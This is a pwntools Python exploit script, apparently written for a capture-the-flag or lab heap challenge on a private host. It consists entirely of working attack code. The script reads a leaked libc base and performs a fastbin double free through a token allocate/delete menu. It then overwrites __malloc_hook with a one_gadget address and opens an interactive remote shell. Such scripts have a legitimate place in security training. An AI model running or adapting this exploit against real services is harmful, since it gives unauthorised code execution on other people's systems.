from pwn import *

elf = context.binary = ELF('./libc.so.6',checksec=False)

hook_addr=elf.symbols['__malloc_hook']
binsh_addr=int('0x10a2fc',16)

HOST = '10.21.232.3'
PORT = 20202

# Connect to the remote server
io = remote(HOST, PORT)

# -- Exploit goes here --
def exploit():

    io.recvuntil('Libc base: ')

    libc_base = int(io.recvline().strip(),16)

    for i in range(9):
        io.sendlineafter("Action: ", 'g')
        io.sendlineafter("Enter the name for the token: ", "token " + str(i))
    
    for i in range(7):
        io.sendlineafter("Action: ", 'd')
        io.sendlineafter("Enter the index of the token: ", str(i))

    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","7")
    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","8")
    io.sendlineafter("Action: ",'d')
    io.sendlineafter("Enter the index of the token: ","7")

    for i in range(7):
        io.sendlineafter("Action: ", 'g')
        io.sendlineafter("Enter the name for the token: ", "token " + str(i))
    
    abs_hook_addrs=libc_base+hook_addr
    abs_bin_addrs=libc_base+binsh_addr

    log.info(p64(abs_hook_addrs))
    log.info(p64(abs_bin_addrs))

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", p64(abs_hook_addrs))

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", "token 8")

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", "token 9")

    io.sendlineafter("Action: ", 'g')
    io.sendlineafter("Enter the name for the token: ", p64(abs_bin_addrs))

    io.sendlineafter("Action: ", 'g')
    # io.sendlineafter("Enter the name for the token: ", "shell pwned")

# io=start()

exploit()

io.interactive()
